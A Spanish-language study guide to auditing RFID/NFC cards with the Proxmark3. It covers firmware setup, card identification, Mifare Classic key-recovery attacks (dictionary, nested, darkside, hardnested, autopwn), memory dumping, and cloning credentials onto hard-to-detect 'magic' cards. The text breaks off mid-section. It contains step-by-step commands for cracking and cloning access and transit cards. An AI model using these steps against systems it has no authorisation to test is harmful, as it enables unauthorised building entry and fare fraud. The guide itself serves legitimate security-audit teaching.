# Guía Técnica de Estudio: Auditoría de Tarjetas RFID/NFC con Proxmark3

## Descripción General

Esta guía técnica proporciona un recorrido completo y estructurado para profesionales de la ciberseguridad que desean dominar la auditoría de sistemas RFID/NFC utilizando el Proxmark3. Desde los fundamentos teóricos hasta técnicas avanzadas de ataque, este documento cubre todo el ciclo de una auditoría de seguridad física: reconocimiento, obtención de claves, clonación, manipulación de datos y validación práctica.

El contenido está diseñado tanto para principiantes que se inician en la seguridad de radiofrecuencia como para auditores experimentados que buscan una referencia técnica detallada. Cada sección incluye explicaciones conceptuales, procedimientos paso a paso y ejemplos prácticos de comandos, permitiendo al lector comprender no solo el "cómo" sino también el "por qué" detrás de cada técnica.

**Nota Importante**: Las técnicas descritas en esta guía deben utilizarse exclusivamente en contextos legales y éticos, como auditorías de seguridad autorizadas, investigaciones académicas o evaluaciones de sistemas propios. El uso indebido de estas herramientas puede constituir un delito en la mayoría de las jurisdicciones.

## Índice

- [1. Fundamentos e Instalación](#1-fundamentos-e-instalación)
  - [1.1. Introducción a las Tecnologías Clave](#11-introducción-a-las-tecnologías-clave)
  - [1.2. Puesta en Marcha: Compilación y Flasheo del Firmware](#12-puesta-en-marcha-compilación-y-flasheo-del-firmware)
    - [1. Preparación del Entorno (Windows)](#1-preparación-del-entorno-windows)
    - [2. Preparación del Entorno (Linux/WSL)](#2-preparación-del-entorno-linuxwsl)
    - [3. Configuración del Makefile.platform](#3-configuración-del-makefileplatform)
    - [4. Compilación y Flasheo](#4-compilación-y-flasheo)
    - [5. Recuperación de un Brick (El "Truco del Botón")](#5-recuperación-de-un-brick-el-truco-del-botón)
- [2. Reconocimiento y Obtención de Claves](#2-reconocimiento-y-obtención-de-claves)
  - [2.1. Identificación y Análisis Inicial de la Tarjeta](#21-identificación-y-análisis-inicial-de-la-tarjeta)
  - [2.2. Ataques para la Obtención de Claves](#22-ataques-para-la-obtención-de-claves)
    - [1. Ataque de Diccionario (Claves por Defecto)](#1-ataque-de-diccionario-claves-por-defecto)
    - [2. Ataque Nested (Claves No Estándar)](#2-ataque-nested-claves-no-estándar)
    - [3. Ataque StaticNested](#3-ataque-staticnested)
  - [2.3. Lectura del Contenido de la Tarjeta](#23-lectura-del-contenido-de-la-tarjeta)
- [3. Clonación y Manipulación](#3-clonación-y-manipulación)
  - [3.1. Creación de un Backup y Clonación](#31-creación-de-un-backup-y-clonación)
    - [1. Creación del Archivo de Backup](#1-creación-del-archivo-de-backup)
    - [2. Clonación a una Tarjeta Mágica](#2-clonación-a-una-tarjeta-mágica)
  - [3.2. Manipulación de Datos](#32-manipulación-de-datos)
- [4. Pruebas Reales y Simulación](#4-pruebas-reales-y-simulación)
  - [4.1. Simulación de Tarjetas](#41-simulación-de-tarjetas)
    - [Simulación de Alta Frecuencia (HF)](#simulación-de-alta-frecuencia-hf)
    - [Simulación de Baja Frecuencia (LF)](#simulación-de-baja-frecuencia-lf)
  - [4.2. Clonación de Etiquetas de Baja Frecuencia (Llaveros)](#42-clonación-de-etiquetas-de-baja-frecuencia-llaveros)
    - [1. Leer la etiqueta original](#1-leer-la-etiqueta-original)
    - [2. Escribir en la etiqueta virgen](#2-escribir-en-la-etiqueta-virgen)
  - [4.3. Pruebas de Acceso Físico](#43-pruebas-de-acceso-físico)
- [5. Herramientas Avanzadas y Automatización](#5-herramientas-avanzadas-y-automatización)
  - [5.1. Acelerando el Proceso de Auditoría](#51-acelerando-el-proceso-de-auditoría)
    - [Diagnósticos Rápidos con fchck](#diagnósticos-rápidos-con-fchck)
    - [Automatización Completa con autopwn](#automatización-completa-con-autopwn)
  - [5.2. Modo de Operación Autónomo (Standalone)](#52-modo-de-operación-autónomo-standalone)
    - [Activación del Modo Standalone](#activación-del-modo-standalone)
    - [Secuencia de Operaciones](#secuencia-de-operaciones)
- [Conclusión](#conclusión)

---

## 1. Fundamentos e Instalación

### 1.1. Introducción a las Tecnologías Clave

En el ámbito de la ciberseguridad, la auditoría de radiofrecuencia (RF) se ha consolidado como una disciplina crítica para evaluar la seguridad de sistemas de control de acceso físico y de pago sin contacto. La proliferación de tecnologías como RFID (Identificación por Radiofrecuencia) y NFC (Comunicación de Campo Cercano) en aplicaciones que van desde tarjetas de transporte público hasta pasaportes electrónicos y accesos corporativos, exige un profundo conocimiento de sus mecanismos de seguridad. Herramientas especializadas como el Proxmark3 son, por tanto, fundamentales en el arsenal de cualquier profesional de la seguridad. Comprender estas tecnologías no es un mero ejercicio académico, sino una necesidad estratégica para identificar y mitigar vulnerabilidades que podrían tener consecuencias físicas y financieras directas.

A continuación, se describen los conceptos esenciales para iniciar una auditoría con el Proxmark3:

**Proxmark3**: Es una herramienta de investigación y auditoría de RFID, diseñada para analizar, suplantar y clonar etiquetas de radiofrecuencia. Su arquitectura de hardware se basa en un procesador ARM (CPU), una FPGA (Field-Programmable Gate Array) para el manejo de señales de bajo nivel y una Memoria Flash para almacenar el firmware. Esta combinación le confiere una versatilidad única para interactuar con una amplia gama de protocolos RFID tanto de baja como de alta frecuencia.

**Tarjetas Mifare Classic**: Son uno de los tipos de tarjetas inteligentes sin contacto más extendidos en el mercado, utilizadas masivamente en sistemas de control de acceso y transporte. Su seguridad se basa en el cifrador propietario CRYPTO1, con una clave secreta de 48 bits. Una clave de 48 bits es, según los estándares criptográficos modernos, extremadamente débil y susceptible a ataques de fuerza bruta en cuestión de segundos con hardware ordinario. La seguridad del sistema dependía de mantener el algoritmo en secreto (security by obscurity), una práctica que ha demostrado ser ineficaz una vez que el cifrador fue desmantelado mediante ingeniería inversa en 2008. La memoria de la tarjeta está organizada lógicamente en sectores, que a su vez se dividen en bloques. El último bloque de cada sector, conocido como sector trailer, almacena las dos claves de acceso (A y B) y las condiciones de acceso para ese sector.

**Diferencias Tecnológicas (LF vs HF)**: Las tecnologías RFID operan en distintas bandas de frecuencia, cada una con características y aplicaciones específicas. Las dos más relevantes para el Proxmark3 son:

| Tecnología | Rango de Frecuencia | Ejemplos de Uso Común |
|------------|---------------------|------------------------|
| Baja Frecuencia (LF) | 125-134 kHz | Control de acceso (llaveros y tarjetas de proximidad, p. ej., EM410x), seguimiento de activos. |
| Alta Frecuencia (HF) | 13.56 MHz | Tarjetas de transporte público (Mifare), sistemas de pago sin contacto (NFC), pasaportes electrónicos. |

Con una base teórica sólida sobre estos conceptos, el siguiente paso es preparar la herramienta para su uso práctico, un proceso que implica compilar y flashear el firmware más adecuado.

### 1.2. Puesta en Marcha: Compilación y Flasheo del Firmware

El proceso de compilación y flasheo del firmware del Proxmark3 no es un paso opcional, sino una tarea crítica y recurrente para cualquier analista de seguridad. El firmware, especialmente la popular bifurcación RRG/Iceman, se encuentra en un estado de desarrollo constante ("bleeding edge"), con nuevas funcionalidades, optimizaciones y correcciones de errores que se añaden continuamente. Para un auditor, esto no es un inconveniente, sino una ventaja táctica. Cada actualización puede contener nuevos vectores de ataque contra sistemas de RF recientemente descubiertos, y no mantener la herramienta actualizada es el equivalente a ir a un pentest con un arsenal obsoleto. Mantener el cliente (el software en el PC) y el firmware (el software en el dispositivo) perfectamente sincronizados es vital para garantizar la estabilidad y el acceso a las últimas técnicas de ataque.

El siguiente procedimiento detalla la puesta en marcha de un Proxmark3 Easy (clasificado como PM3GENERIC) con el firmware RRG/Iceman.

#### 1. Preparación del Entorno (Windows)

El método más recomendado y consistente para Windows es utilizar **ProxSpace** (versión 3.x o superior). Se trata de un entorno de desarrollo sandbox preconfigurado que incluye el toolchain GNU ARM y un entorno Bash, eliminando la complejidad de gestionar dependencias manualmente.

Descarga ProxSpace desde el repositorio oficial y ejecútalo. Una vez dentro del entorno ProxSpace, clona el repositorio oficial de RRG/Iceman:

```bash
git clone https://github.com/RfidResearchGroup/proxmark3.git
cd proxmark3
```

#### 2. Preparación del Entorno (Linux/WSL)

En sistemas Linux o en el Subsistema de Windows para Linux (WSL), es necesario instalar las dependencias manualmente. A continuación se proporciona el comando completo de instalación para una distribución basada en Debian/Ubuntu:

```bash
sudo apt-get update
sudo apt-get install --no-install-recommends git ca-certificates build-essential pkg-config \
libreadline-dev gcc-arm-none-eabi libnewlib-dev qtbase5-dev \
libbz2-dev liblz4-dev libbluetooth-dev libpython3-dev libssl-dev libgd-dev
```

**Desglose de dependencias por función:**

| Función | Paquetes |
|---------|----------|
| Compilador Cruzado ARM | `gcc-arm-none-eabi`, `libnewlib-dev` |
| Herramientas Base | `git`, `ca-certificates`, `build-essential`, `pkg-config` |
| Cliente Proxmark3 | `libreadline-dev`, `libbz2-dev`, `liblz4-dev`, `libssl-dev` |
| Soporte Bluetooth (opcional) | `libbluetooth-dev` |
| Interfaz gráfica (opcional) | `qtbase5-dev` |
| Scripts Python (opcional) | `libpython3-dev` |
| Soporte NFC ePaper (opcional) | `libgd-dev` |

> **⚠️ Advertencia Crítica sobre ModemManager:**
>
> Un punto de fallo común en Linux es la interferencia del servicio **ModemManager**, que sondea automáticamente los puertos serie USB para detectar módems. Este servicio puede interferir con la comunicación del Proxmark3 e incluso **causar un brick del dispositivo durante el flasheo**. Es **obligatorio** deshabilitarlo antes de proceder:
> ```bash
> sudo systemctl stop ModemManager
> sudo systemctl disable ModemManager
> ```

Después de instalar las dependencias, clona el repositorio:

```bash
git clone https://github.com/RfidResearchGroup/proxmark3.git
cd proxmark3
```

#### 3. Configuración del Makefile.platform

Este paso es **crítico y obligatorio** para evitar un brick del dispositivo. La configuración incorrecta puede resultar en un firmware incompatible que exceda el tamaño de la memoria flash o utilice configuraciones de hardware incorrectas.

**¿Por qué es necesario?** El repositorio está optimizado por defecto para el Proxmark3 RDV4, que tiene 512KB de flash y características adicionales (flash SPI externo, módulo de tarjeta inteligente). Los dispositivos genéricos como el Proxmark3 Easy pueden tener solo 256KB de flash y carecen de estas características.

Copia el archivo de configuración de ejemplo:

```bash
cp Makefile.platform.sample Makefile.platform
```

Edita el archivo `Makefile.platform` con tu editor preferido (nano, vim, etc.):

```bash
nano Makefile.platform
```

**Para un Proxmark3 Easy/Generic estándar (512KB):**

```makefile
PLATFORM=PM3GENERIC
```

**Para un Proxmark3 Easy con solo 256KB de flash:**

Si tu dispositivo tiene limitaciones de memoria (256KB), deberás desactivar funcionalidades para reducir el tamaño del firmware. Una configuración funcional típica sería:

```makefile
PLATFORM=PM3GENERIC
PLATFORM_SIZE=256
STANDALONE=
SKIP_HITAG=1
SKIP_FELICA=1
```

> **Nota:** El parámetro `PLATFORM_SIZE=256` provocará un error de compilación si el firmware excede el límite de 256KB, evitando así un brick por firmware demasiado grande.

#### 4. Compilación y Flasheo

Con el entorno preparado y la configuración correcta, procede a compilar e instalar el firmware:

**Paso 1 - Compilación:**

```bash
make clean && make -j
```

El parámetro `-j` habilita la compilación en paralelo, acelerando significativamente el proceso.

**Paso 2 - Flasheo del Firmware:**

El método más sencillo y recomendado es utilizar el script automático que detecta el puerto:

```bash
pm3-flash-all
```

Este comando flashea tanto el **bootrom** como el **fullimage** en una sola operación.

**Alternativa (especificando el puerto manualmente):**

Si el script automático no detecta tu dispositivo, especifica el puerto manualmente:

```bash
# En Linux
proxmark3 /dev/ttyACM0 --flash --unlock-bootloader --image bootrom.elf --image fullimage.elf

# En Windows (desde ProxSpace)
proxmark3 com3 --flash --unlock-bootloader --image bootrom.elf --image fullimage.elf
```

#### 5. Recuperación de un Brick (El "Truco del Botón")

Si el dispositivo no responde después del flasheo o no es detectado por el flasher (especialmente en la primera vez que se flashea un dispositivo nuevo), puedes forzarlo a entrar en modo bootloader:

**Procedimiento:**

1. **Desconecta** el Proxmark3 del puerto USB completamente.
2. **Mantén presionado** el botón físico del dispositivo.
3. **Mientras mantienes el botón presionado**, conecta el dispositivo al puerto USB.
4. **Observa los LEDs**: Dos de los cuatro LEDs deberían permanecer encendidos cuando sueltes el botón. Esto indica que estás en modo bootloader.
5. Suelta el botón (excepto en bootloaders muy antiguos, donde debes mantenerlo presionado durante todo el proceso).
6. Ejecuta nuevamente el comando de flasheo:

```bash
pm3-flash-all
```

> **Nota importante:** Si los LEDs no permanecen encendidos al soltar el botón, tienes un bootloader muy antiguo. En ese caso, repite el proceso pero **mantén el botón presionado durante todo el flasheo**.

#### 6. Verificación de la Instalación

Una vez completado el flasheo exitosamente, ejecuta el cliente para verificar que todo funciona correctamente:

```bash
pm3
```

O especificando el puerto:

```bash
proxmark3 /dev/ttyACM0
```

Dentro del cliente, ejecuta:

```
hw status
hw version
```

Deberías ver información sobre tu dispositivo, confirmando que el firmware y el cliente están sincronizados y funcionando correctamente.

Con el dispositivo actualizado y correctamente configurado, ya está listo para comenzar la fase de reconocimiento de tarjetas objetivo.

## 2. Reconocimiento y Obtención de Claves

### 2.1. Identificación y Análisis Inicial de la Tarjeta

Al igual que en una prueba de penetración de redes, la primera fase práctica de una auditoría RFID es el reconocimiento. Antes de intentar cualquier ataque, es fundamental identificar el tipo de tarjeta objetivo para determinar su tecnología, posibles vulnerabilidades y las vías de ataque más efectivas.

#### Identificación de Tarjetas de Alta Frecuencia (HF)

Para realizar una identificación inicial de una tarjeta de alta frecuencia (HF, 13.56 MHz), ejecuta el comando de búsqueda universal:

```bash
hf search
```

Este comando realiza un análisis automático y exhaustivo de la tarjeta presente, intentando identificar su tipo mediante la interacción con diferentes protocolos (ISO14443-A, ISO14443-B, ISO15693, etc.).

**Información crítica que devuelve el comando:**

- **UID (Unique Identifier)**: El número de serie único de la tarjeta. Puede ser de 4, 7 o 10 bytes. Un UID de 4 bytes suele indicar una tarjeta más simple, mientras que UIDs más largos pueden corresponder a tarjetas con mayor nivel de seguridad o funcionalidades extendidas.

- **ATQA (Answer to Request, Type A)**: Un valor de 2 bytes que proporciona información preliminar sobre el tipo de tarjeta y sus capacidades de comunicación. Por ejemplo, `0x0004` es común en Mifare Classic 1K.

- **SAK (Select Acknowledge)**: Este valor de 1 byte es **crucial para el auditor**, ya que determina de manera definitiva el tipo y tamaño de la tarjeta:
  - `0x08`: Mifare Classic 1K (16 sectores de 4 bloques cada uno, 1024 bytes totales)
  - `0x09`: Mifare Classic Mini (5 sectores, 320 bytes)
  - `0x18`: Mifare Classic 4K (40 sectores: 32 de 4 bloques + 8 de 16 bloques, 4096 bytes)
  - `0x28`: Mifare Classic 1K emulada
  - `0x88`: Mifare Classic 1K infinita (algunas tarjetas especiales)

- **ATS (Answer To Select)**: Si está presente, indica que la tarjeta soporta ISO14443-4, lo que puede significar que no es una Mifare Classic estándar.

**Ejemplo de salida típica:**

```
[+] UID: 35 3C 2A A6
[+] ATQA: 00 04
[+] SAK: 08 [2]
[=] TYPE: MIFARE Classic 1K
[=] Possible Types:
[+]  MIFARE Classic 1K
```

**Análisis adicional con comando específico:**

Para obtener información más detallada sobre una tarjeta Mifare específica, utiliza:

```bash
hf mf info
```

Este comando además de identificar el tipo de tarjeta, realiza pruebas para detectar:
- **Tarjetas mágicas** (Gen1a, Gen2, DirectWrite, etc.): Responden a comandos especiales de backdoor que permiten reescribir el bloque 0 (UID).
- **PRNG débil**: Algunas tarjetas Mifare antiguas utilizan generadores de números pseudoaleatorios predecibles, haciéndolas vulnerables al ataque Darkside.
- **Nonces estáticos**: Detecta si la tarjeta implementa nonces estáticos cifrados (contramedida contra el ataque nested).

#### Identificación de Tarjetas de Baja Frecuencia (LF)

Para tarjetas de baja frecuencia (125-134 kHz), como llaveros de acceso comunes, el comando es:

```bash
lf search
```

Este comando intenta identificar protocolos LF comunes como EM410x, HID Prox, Indala, T55x7, entre otros.

Una vez identificado el tipo de tarjeta como Mifare Classic, el siguiente paso lógico es intentar obtener las claves criptográficas que protegen el acceso a sus sectores de memoria.

### 2.2. Ataques para la Obtención de Claves

La estrategia para obtener las claves de una tarjeta Mifare Classic sigue un enfoque metodológico, comenzando con los métodos más simples y rápidos y escalando hacia técnicas más complejas solo si los primeros fallan. Este proceso demuestra una progresión lógica desde la explotación de configuraciones débiles hasta vulnerabilidades más profundas del protocolo.

#### 1. Herramienta Automatizada: autopwn (Recomendado)

El comando `hf mf autopwn` es la herramienta de automatización integral por excelencia para la auditoría de Mifare Classic. Ejecuta una secuencia inteligente y adaptativa de múltiples técnicas de ataque en el siguiente orden:

1. **Ataque de diccionario** con claves por defecto
2. **Ataque Darkside** (si la tarjeta es vulnerable)
3. **Ataque Nested** (si se encuentra al menos una clave)
4. **Ataque StaticNested** (para tarjetas con contramedidas)

**Sintaxis básica:**

```bash
hf mf autopwn
```

**Opciones avanzadas:**

```bash
hf mf autopwn --1k                           # Especifica Mifare Classic 1K
hf mf autopwn -k FFFFFFFFFFFF                # Proporciona una clave conocida como punto de partida
hf mf autopwn -s 0 -a -k FFFFFFFFFFFF       # Especifica sector 0, clave A conocida
hf mf autopwn -f mfc_default_keys.dic       # Utiliza un diccionario personalizado
hf mf autopwn --slow                         # Modo lento para tarjetas no estándar
hf mf autopwn -v                             # Salida verbose con estadísticas
```

**Parámetros importantes:**

| Parámetro | Descripción |
|-----------|-------------|
| `--1k` / `--2k` / `--4k` / `--mini` | Especifica el tamaño de la tarjeta |
| `-k, --key <hex>` | Clave conocida (12 caracteres hexadecimales) |
| `-s, --sector <dec>` | Número de sector de la clave conocida |
| `-a` / `-b` | Especifica si la clave conocida es tipo A o B |
| `-f, --file <fn>` | Archivo de diccionario de claves |
| `--slow` | Adquisición más lenta (requerido para algunas tarjetas no estándar) |
| `-l, --legacy` | Usa el modo legacy (comando `hf mf chk` lento) |
| `-v, --verbose` | Salida detallada con estadísticas |

**Salida del comando:**

Si tiene éxito, `autopwn` genera automáticamente:
- **Archivo de claves**: `hf-mf-<UID>-key.bin` - Contiene todas las claves recuperadas
- **Archivo de volcado**: `hf-mf-<UID>-dump.bin` - Volcado completo de la memoria de la tarjeta
- **Archivo EML**: `hf-mf-<UID>-dump.eml` - Formato de texto para emulación
- **Archivo JSON**: `hf-mf-<UID>-dump.json` - Formato estructurado para análisis

#### 2. Ataques Manuales Específicos

Para situaciones donde se requiere un control más granular o cuando autopwn no tiene éxito, los siguientes ataques pueden ejecutarse manualmente:

##### 2.1. Ataque de Diccionario (Claves por Defecto)

Una cantidad sorprendentemente alta de sistemas que utilizan tarjetas Mifare Classic (estudios indican más del 30%) no cambian las claves de transporte predeterminadas de fábrica. Las claves más comunes son:

- `FFFFFFFFFFFF` (clave de fábrica por defecto)
- `A0A1A2A3A4A5` (clave MAD - Mifare Application Directory)
- `D3F7D3F7D3F7` (clave NDEF)
- `000000000000` (clave en blanco)
- `B0B1B2B3B4B5`, `AABBCCDDEEFF`, entre otras

**Comando de verificación rápida:**

```bash
hf mf chk --1k                               # Usa diccionario por defecto
hf mf chk --1k -f mfc_default_keys.dic      # Usa diccionario personalizado
hf mf chk --1k --dump                        # Guarda las claves encontradas
hf mf chk --1k --emu                         # Carga las claves en el emulador
```

**Verificación rápida (más veloz):**

El comando `hf mf fchk` (fast check) es una versión optimizada del ataque de diccionario:

```bash
hf mf fchk --1k                              # Verificación rápida con diccionario por defecto
hf mf fchk --1k --mem                        # Usa diccionario desde flashmemory (RDV4)
hf mf fchk --1k -f mfc_default_keys.dic     # Usa diccionario personalizado
```

##### 2.2. Ataque Nested

Este ataque explota una vulnerabilidad criptográfica fundamental en el protocolo de autenticación de CRYPTO1. Cuando el Proxmark3 se autentica con una clave conocida (ya sea A o B de cualquier sector), puede capturar información que se filtra del estado interno del cifrador durante las comunicaciones subsiguientes. Esta filtración permite calcular matemáticamente las claves de otros sectores.

**¿Cómo funciona?** Durante la autenticación, CRYPTO1 genera un "nonce" (número usado una sola vez). La debilidad radica en que el nonce y la respuesta cifrada revelan suficiente información sobre el keystream, permitiendo que un atacante con una clave conocida pueda derivar otras claves mediante análisis criptográfico.

**Sintaxis:**

```bash
hf mf nested --1k                                           # Automático para todas las claves
hf mf nested --1k --blk 0 -a -k FFFFFFFFFFFF              # Especifica bloque y clave conocida
hf mf nested --1k --blk 0 -a -k FFFFFFFFFFFF --dump       # Guarda dump automáticamente
```

**Parámetros:**

| Parámetro | Descripción |
|-----------|-------------|
| `--blk <dec>` | Número de bloque con clave conocida |
| `-a` / `-b` | Tipo de clave conocida (A o B) |
| `-k, --key <hex>` | Clave conocida (12 hex bytes) |
| `--tblk <dec>` | Bloque objetivo (opcional) |
| `--ta` / `--tb` | Tipo de clave objetivo |
| `--dump` | Genera dump automático tras recuperar todas las claves |

**Tiempo de ejecución:** Generalmente entre 5-30 segundos para recuperar todas las claves de una tarjeta 1K, dependiendo de la calidad de la señal.

##### 2.3. Ataque StaticNested

Como contramedida directa al ataque nested, algunos fabricantes implementaron tarjetas con **nonces estáticos cifrados**. Estas tarjetas generan siempre el mismo nonce para una clave dada, pero cifrado, intentando frustrar el ataque nested tradicional.

El ataque `staticnested` fue desarrollado específicamente para superar esta protección, demostrando la continua carrera armamentista en la seguridad de RF. Funciona recolectando múltiples respuestas cifradas y analizando los patrones para derivar las claves.

**Sintaxis:**

```bash
hf mf staticnested --1k --blk 0 -a -k FFFFFFFFFFFF
```

Los parámetros son idénticos al ataque nested estándar.

**Nota importante:** Este ataque requiere más tiempo (puede tardar varios minutos) y no todas las implementaciones de nonces estáticos son vulnerables. El comando intentará detectar automáticamente si la tarjeta es susceptible.

##### 2.4. Ataque Darkside (Tarjetas con PRNG Débil)

Algunas tarjetas Mifare Classic antiguas o de fabricantes alternativos utilizan generadores de números pseudoaleatorios (PRNG) débiles o predecibles. El ataque Darkside explota esta debilidad.

**Sintaxis:**

```bash
hf mf darkside
```

Este ataque es completamente autónomo y no requiere conocer ninguna clave previamente. Si la tarjeta es vulnerable, puede recuperar una clave válida en cuestión de segundos.

##### 2.5. Ataque Hardnested (Último Recurso)

Para tarjetas "endurecidas" que implementan contramedidas más sofisticadas, el ataque hardnested utiliza técnicas criptoanalíticas avanzadas y análisis estadístico profundo.

**Sintaxis:**

```bash
hf mf hardnested --blk 0 -a -k FFFFFFFFFFFF --tblk 4 --ta
```

**Advertencia:** Este ataque puede tardar desde varios minutos hasta horas, requiere recolección de un gran número de nonces (~50,000+) y procesamiento offline intensivo. Se recomienda solo cuando todos los otros métodos han fallado.

### 2.3. Lectura del Contenido de la Tarjeta

Obtener las claves de acceso es el objetivo principal de la fase de ataque, ya que concede control total sobre la información almacenada en la tarjeta. Con las claves, un auditor puede leer, modificar o clonar los datos, que en última instancia representan el activo que el sistema de seguridad pretende proteger (por ejemplo, un crédito de transporte, un permiso de acceso o datos de identificación).

#### Lectura de Bloques Individuales

Para leer un bloque de memoria específico, se utiliza el comando `hf mf rdbl` (read block):

**Sintaxis:**

```bash
hf mf rdbl --blk <número> -a -k <clave>     # Usando clave A
hf mf rdbl --blk <número> -b -k <clave>     # Usando clave B
```

**Ejemplos prácticos:**

```bash
hf mf rdbl --blk 0 -a -k FFFFFFFFFFFF       # Lee el bloque 0 (fabricante) con clave A por defecto
hf mf rdbl --blk 4 -a -k FFFFFFFFFFFF       # Lee el bloque 4 (primer bloque del sector 1)
hf mf rdbl --blk 7 -a -k A0A1A2A3A4A5       # Lee el sector trailer del sector 1
```

**Parámetros:**

| Parámetro | Descripción |
|-----------|-------------|
| `--blk <dec>` | Número de bloque a leer (0-255 dependiendo del tamaño de la tarjeta) |
| `-a` | Usar clave tipo A (por defecto) |
| `-b` | Usar clave tipo B |
| `-k, --key <hex>` | Clave de autenticación (12 caracteres hexadecimales) |

#### Lectura de Sectores Completos

Para leer todos los bloques de un sector específico, utiliza el comando `hf mf rdsc` (read sector):

```bash
hf mf rdsc -s 0 -a -k FFFFFFFFFFFF          # Lee todo el sector 0
hf mf rdsc -s 1 -a -k FFFFFFFFFFFF          # Lee todo el sector 1
```

Este comando es más eficiente cuando necesitas analizar todos los datos de un sector específico.

#### Volcado Completo de la Tarjeta

En la práctica, la lectura bloque por bloque rara vez es necesaria. Para un análisis completo, se recomienda realizar un **volcado total de la memoria**.

**Volcado automático tras recuperar claves:**

Tras un ataque exitoso con `hf mf autopwn`, se generan automáticamente varios archivos:

- `hf-mf-<UID>-dump.bin` - Volcado binario completo
- `hf-mf-<UID>-dump.eml` - Formato emulador (texto)
- `hf-mf-<UID>-dump.json` - Formato JSON estructurado
- `hf-mf-<UID>-key.bin` - Todas las claves recuperadas

**Volcado manual con archivo de claves:**

Si ya tienes un archivo de claves previamente guardado:

```bash
hf mf dump --1k                                        # Busca archivo de claves automáticamente basado en UID
hf mf dump --1k -k hf-mf-<UID>-key.bin                # Especifica archivo de claves
hf mf dump --1k -k hf-mf-<UID>-key.bin -f mydump      # Especifica nombre de salida personalizado
```

**Parámetros del comando dump:**

| Parámetro | Descripción |
|-----------|-------------|
| `--1k` / `--2k` / `--4k` / `--mini` | Tamaño de la tarjeta |
| `-k, --keys <fn>` | Archivo con las claves |
| `-f, --file <fn>` | Nombre personalizado para el archivo de salida |

#### Visualización del Contenido del Dump

Para analizar el contenido de un volcado sin necesidad de editores hexadecimales:

```bash
hf mf view -f hf-mf-<UID>-dump.bin                    # Vista completa del dump
hf mf view -f hf-mf-<UID>-dump.eml                    # Vista desde archivo EML
```

Este comando muestra:
- **Datos de cada bloque** en formato hexadecimal y ASCII
- **Sector trailers** con las claves y bytes de acceso
- **Decodificación de los bits de acceso** para cada sector
- **Bloques de valor** (si existen) con su interpretación decimal

#### Análisis de Bits de Acceso (Access Bits)

Para comprender los permisos de lectura/escritura de un sector específico:

```bash
hf mf acl -d <hex>                                     # Decodifica los access bits
```

**Ejemplo:**

```bash
hf mf acl -d 787788                                    # Decodifica los access bits típicos de fábrica
```

Esto mostrará una tabla interpretando qué operaciones (lectura, escritura, incremento, decremento) son permitidas con cada clave (A o B) para cada bloque del sector.

#### Estructura de Memoria Mifare Classic 1K

Para interpretar correctamente los datos, es importante comprender la estructura:

| Sectores | Bloques por Sector | Bloques Totales | Bytes por Bloque | Total |
|----------|-------------------|-----------------|------------------|-------|
| 16 | 4 | 64 | 16 | 1024 bytes |

- **Bloque 0 (Sector 0)**: Contiene el UID (4 bytes), BCC, manufacturer data. **Solo lectura en tarjetas estándar**.
- **Bloques 1-2 (Sector 0)**: Datos de usuario.
- **Bloque 3 (Sector trailer)**: Contiene Key A (6 bytes), Access Bits (3 bytes), GPB (1 byte), Key B (6 bytes).
- **Sectores 1-15**: Igual estructura (bloques de datos + sector trailer).

**Aplicación en el Mundo Real**: La eficacia de estas técnicas de ataque no es meramente teórica. Han sido demostradas públicamente contra sistemas de transporte a gran escala:

- **Oyster Card (Londres)**: El sistema fue comprometido en 2008, demostrando que las claves de transporte no estaban adecuadamente protegidas.
- **OV-Chipkaart (Países Bajos)**: Vulnerabilidades similares forzaron actualizaciones masivas del sistema.
- **Sistemas de metro de Boston, Madrid y otros**: También fueron objeto de demostraciones académicas de estas vulnerabilidades.

Estos casos obligaron a los operadores a actualizar su infraestructura de seguridad, implementar nuevas tecnologías (como Mifare DESFire, MIFARE Plus o sistemas basados en tokens únicos) y reforzar la protección de las claves criptográficas.

La capacidad de leer y volcar el contenido completo de una tarjeta es el prerrequisito para el siguiente y más impactante paso de la auditoría: la clonación y manipulación de datos.

## 3. Clonación y Manipulación

### 3.1. Creación de un Backup y Clonación

La clonación de una tarjeta RFID es una prueba de concepto definitiva que demuestra una vulnerabilidad crítica en un sistema de control de acceso. Más allá de un simple duplicado, representa la materialización de un riesgo: la capacidad de un actor malicioso para crear una credencial funcional indistinguible de la original. Este paso es crucial para comunicar el impacto real de las debilidades criptográficas a las partes interesadas.

El proceso de clonación de una tarjeta Mifare Classic se realiza en dos etapas fundamentales:

#### 1. Creación del Archivo de Backup

Como se mencionó anteriormente, comandos como `hf mf autopwn` generan automáticamente un archivo de volcado de la memoria (dump) al finalizar con éxito. Este archivo, cuyo nombre incluye el UID de la tarjeta original (p. ej., `hf-mf-A29558E4-dump.bin`), sirve como la "fuente" o el "backup" completo de la tarjeta original.

**Archivos generados automáticamente:**
- `hf-mf-<UID>-dump.bin` - Volcado binario completo
- `hf-mf-<UID>-dump.eml` - Formato emulador (texto)
- `hf-mf-<UID>-dump.json` - Formato JSON estructurado
- `hf-mf-<UID>-key.bin` - Todas las claves recuperadas

#### 2. Clonación a una Tarjeta Mágica

La clonación de una tarjeta Mifare Classic requiere una tarjeta virgen especial, comúnmente conocida como "tarjeta mágica". Existen diferentes tipos de tarjetas mágicas, cada una con características y métodos de escritura específicos:

**Tipos de Tarjetas Mágicas:**

| Tipo | Nombre Alternativo | Características | Detección |
|------|-------------------|-----------------|----------|
| **Gen1A** | UID, ZERO (RU) | Comandos backdoor `40(7)`, `43` | Fácilmente detectable |
| **Gen2** | CUID, DirectWrite | Escritura directa a bloque 0 | Difícil de detectar |
| **Gen3** | APDU | Comandos APDU especiales | Muy difícil de detectar |
| **Gen4** | Ultimate Magic Card (UMC) | Completamente configurable | Indetectable si configurada correctamente |

**Proceso de Clonación Completo:**

##### Método 1: Secuencia Automatizada (Recomendado para Gen2/CUID)

```bash
# Para tarjetas Gen2/CUID (más modernas y difíciles de detectar)
hf mf restore --1k --uid A29558E4 -k hf-mf-A29558E4-key.bin -f hf-mf-A29558E4-dump.bin
```

**Parámetros del comando restore:**

| Parámetro | Descripción |
|-----------|-------------|
| `--1k` / `--2k` / `--4k` / `--mini` | Tamaño de la tarjeta objetivo |
| `--uid <hex>` | UID de la tarjeta original (opcional, se lee del dump) |
| `-k, --keys <fn>` | Archivo con las claves |
| `-f, --file <fn>` | Archivo de dump a restaurar |
| `--emu` | Cargar datos en el emulador después de restaurar |

##### Método 2: Clonación Manual para Tarjetas Gen1A

Las tarjetas Gen1A requieren comandos especiales de backdoor para modificar el bloque 0:

```bash
# 1. Identificar el tipo de tarjeta mágica
hf mf info
# Salida esperada: [+] Magic capabilities... Gen 1a

# 2. Limpiar la tarjeta (opcional pero recomendado)
# Para 1K:
